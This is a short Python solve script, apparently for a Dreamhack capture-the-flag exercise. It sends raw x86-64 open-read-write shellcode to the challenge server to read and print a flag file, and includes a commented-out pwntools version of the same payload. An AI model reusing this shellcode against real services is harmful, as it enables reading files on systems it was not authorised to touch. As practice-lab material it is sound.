# # from pwn import *
# # context.arch = "amd64"

# # flag_path = "/home/shell_basic/flag_name_is_loooooong"
# # sc  = shellcraft.open(flag_path)
# # sc += shellcraft.read("rax", "rsp", 0x100)
# # sc += shellcraft.write(1, "rsp", 0x100)

# # p = remote("host3.dreamhack.games", 10945)  #포트
# # p.sendafter(b"shellcode: ", asm(sc))
# # print(p.recvall(timeout=3).decode())

import socket, time

HOST = "host3.dreamhack.games"
PORT = 10945

shellcode = (
    b"\x48\x31\xc0\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6e\x67\x50\x48"
    b"\xb8\x61\x6d\x65\x5f\x69\x73\x5f\x6c\x50\x48\xb8\x63\x2f\x66\x6c"
    b"\x61\x67\x5f\x6e\x50\x48\xb8\x65\x6c\x6c\x5f\x62\x61\x73\x69\x50"
    b"\x48\xb8\x2f\x68\x6f\x6d\x65\x2f\x73\x68\x50\x48\x89\xe7\x48\x31"
    b"\xf6\x48\x31\xd2\xb8\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89"
    b"\xe6\x48\x81\xee\x00\x01\x00\x00\xba\x00\x01\x00\x00\x48\x31\xc0"
    b"\x0f\x05\x48\x89\xc2\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x0f"
    b"\x05"
)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
s.connect((HOST, PORT))
time.sleep(0.3)
try:
    print("[recv]", s.recv(1024).decode(errors="replace"))
except socket.timeout:
    pass
s.sendall(shellcode)
time.sleep(0.5)
data = b""
try:
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
except socket.timeout:
    pass
print("[flag]", data.decode(errors="replace"))
s.close()